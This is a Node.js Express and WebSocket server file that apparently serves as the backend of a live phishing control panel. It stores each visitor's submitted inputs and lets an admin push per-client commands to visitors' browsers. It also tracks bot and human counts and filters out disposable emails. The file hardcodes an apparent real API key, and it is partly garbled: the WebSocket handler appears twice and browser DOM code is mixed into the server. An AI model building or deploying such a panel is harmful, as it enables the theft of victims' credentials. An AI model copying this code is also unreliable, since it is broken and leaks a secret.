const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ port: 8080 });

// Initialize in-memory SQLite database
const db = new sqlite3.Database(':memory:');

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));


wss.on('connection', function connection(ws, req) {
  const ip = req.connection.remoteAddress;
  console.log('Client connected from IP:', ip);

  // Handle incoming messages from clients
  ws.on('message', function incoming(message) {
    console.log('Received message:', message);
    
    // Example: Broadcast message to all connected clients
    wss.clients.forEach(function each(client) {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  });
});

// Initialize database schema
db.serialize(() => {
    db.run("CREATE TABLE clients (clientId TEXT PRIMARY KEY, ip TEXT, inputs TEXT, command TEXT, timestamp INTEGER)");
    db.run("CREATE TABLE stats (type TEXT PRIMARY KEY, count INTEGER)");
    db.run("INSERT INTO stats (type, count) VALUES ('visitors', 0), ('bots', 0), ('humans', 0)");
});

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.replace('/?', ''));
    const clientId = urlParams.get('clientId');
    const isAdmin = urlParams.get('admin') === 'true';

    if (isAdmin) {
        ws.isAdmin = true;
        sendAdminUpdate(ws);

        ws.on('message', (message) => {
            const { clientId, command } = JSON.parse(message);
            db.run("UPDATE clients SET command = ? WHERE clientId = ?", [command, clientId], () => {
                broadcastToClients({ type: 'command', clientId, command });
            });
        });
    } else if (clientId) {
        db.run("INSERT OR REPLACE INTO clients (clientId, ip, inputs, command, timestamp) VALUES (?, ?, ?, ?, ?)", 
            [clientId, req.socket.remoteAddress, '', 'not', Date.now()]);
        
        db.run("UPDATE stats SET count = count + 1 WHERE type = 'visitors'");

        ws.on('message', (message) => {
            const data = JSON.parse(message);
            if (data.type === 'heartbeat') {
                db.run("UPDATE clients SET timestamp = ? WHERE clientId = ?", [Date.now(), clientId], () => {
                    db.get("SELECT command FROM clients WHERE clientId = ?", [clientId], (err, row) => {
                        ws.send(JSON.stringify({ command: row.command || 'not' }));
                    });
                });
            } else if (data.type === 'update') {
                db.run("UPDATE clients SET inputs = ?, timestamp = ? WHERE clientId = ?", [JSON.stringify(data.inputs), Date.now(), clientId]);
            }
        });

        ws.on('close', () => {
            db.run("DELETE FROM clients WHERE clientId = ?", [clientId]);
            db.run("UPDATE stats SET count = count - 1 WHERE type = 'visitors'");
        });
    }
});

// Utility functions
const broadcastToAdmins = (message) => {
    wss.clients.forEach((client) => {
        if (client.isAdmin) {
            client.send(JSON.stringify(message));
        }
    });
};

const broadcastToClients = (message) => {
    wss.clients.forEach((client) => {
        if (!client.isAdmin) {
            client.send(JSON.stringify(message));
        }
    });
};

const sendAdminUpdate = (ws) => {
    db.all("SELECT * FROM clients", (err, clients) => {
        db.all("SELECT * FROM stats", (err, stats) => {
            const statsObj = stats.reduce((acc, stat) => {
                acc[stat.type] = stat.count;
                return acc;
            }, {});
            ws.send(JSON.stringify({ type: 'adminUpdate', clientList: clients, stats: statsObj }));
        });
    });
};

const updateDatabase = () => {
    db.all("SELECT * FROM clients", (err, clients) => {
        db.all("SELECT * FROM stats", (err, stats) => {
            const statsObj = stats.reduce((acc, stat) => {
                acc[stat.type] = stat.count;
                return acc;
            }, {});
            broadcastToAdmins({ type: 'adminUpdate', clientList: clients, stats: statsObj });
        });
    });
};

// Endpoints
app.post('/input', (req, res) => {
    const { clientId, ...inputData } = req.body;
    db.get("SELECT * FROM clients WHERE clientId = ?", [clientId], (err, row) => {
        if (!row) {
            db.run("INSERT INTO clients (clientId, inputs, command, timestamp) VALUES (?, ?, ?, ?)", 
                [clientId, JSON.stringify(inputData), 'not', Date.now()]);
            db.run("UPDATE stats SET count = count + 1 WHERE type = 'visitors'");
        } else {
            db.run("UPDATE clients SET inputs = ?, command = 'not', timestamp = ? WHERE clientId = ?", 
                [JSON.stringify(inputData), Date.now(), clientId]);
        }
        res.sendStatus(200);
        updateDatabase();
    });
});

app.post('/send-command', (req, res) => {
    const { clientId, command } = req.body;
    db.run("UPDATE clients SET command = ? WHERE clientId = ?", [command, clientId], () => {
        broadcastToClients({ type: 'command', clientId, command });
        res.sendStatus(200);
        updateDatabase();
    });
});

app.post('/delete-client', (req, res) => {
    const { clientId } = req.body;
    db.run("DELETE FROM clients WHERE clientId = ?", [clientId], () => {
        db.run("UPDATE stats SET count = count - 1 WHERE type = 'visitors'");
        res.sendStatus(200);
        updateDatabase();
    });
});

// Periodic admin panel broadcast
const broadcastAdminPanel = () => {
    updateDatabase();
};


app.post('/verify', async (req, res) => {
    const { email } = req.body;
    const apiKey = '59637b640cb0fcbdd080e2b52d6dbc0b9191a2a0e974c746ad9331d23450'; // Replace with your actual API key
    const url = `https://api.quickemailverification.com/v1/verify?email=${email}&apikey=${apiKey}`;

    try {
        // Make request to QuickEmailVerification API
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error('Failed to verify email');
        }

        const data = await response.json();

        // Check the result and disposable status from the API response
        if (data.result === 'valid' && data.disposable === 'false') {
        	console.log(email +" : "+ data);
            res.json({ success: true }); // Email is valid
        } else {
            res.json({ success: false }); // Email is invalid or disposable
        }
    } catch (error) {
        console.error('Error verifying email:', error);
        res.status(500).json({ success: false, error: 'Failed to verify email' });
    }
});


function updateCurrPage(clientId, currPage, isConnected) {
    const thisNameElements = document.querySelectorAll('.thisName');

    thisNameElements.forEach(div => {
        if (div.id === clientId) {
            console.log("currPage: " + currPage);
            div.parentElement.children[2].children[1].textContent = isConnected ? currPage : "Disconnected";
            if (!isConnected) {
                document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "red";
                document.getElementById(`currPage-${clientId}`).parentElement.children[0].style.backgroundColor = "red";
            } else {
                document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "";
                document.getElementById(`currPage-${clientId}`).parentElement.children[0].style.backgroundColor = "green";
            }
        }
    });
}

setInterval(broadcastAdminPanel, 3000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});